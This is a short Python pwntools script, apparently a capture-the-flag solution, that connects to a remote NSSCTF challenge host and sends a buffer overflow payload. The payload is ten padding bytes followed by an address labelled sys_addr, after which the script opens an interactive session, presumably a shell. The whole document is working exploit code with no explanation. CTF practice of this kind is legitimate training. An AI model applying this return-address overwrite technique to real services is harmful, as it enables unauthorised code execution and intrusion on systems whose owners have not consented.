from pwn import *
elf=ELF('./pwn')
p=remote('node5.anna.nssctf.cn',29244)
fopen_addr=0x400444
sys_addr=0x400807
payload=b'a'*10+p64(sys_addr)
p.sendline(payload)
p.interactive()
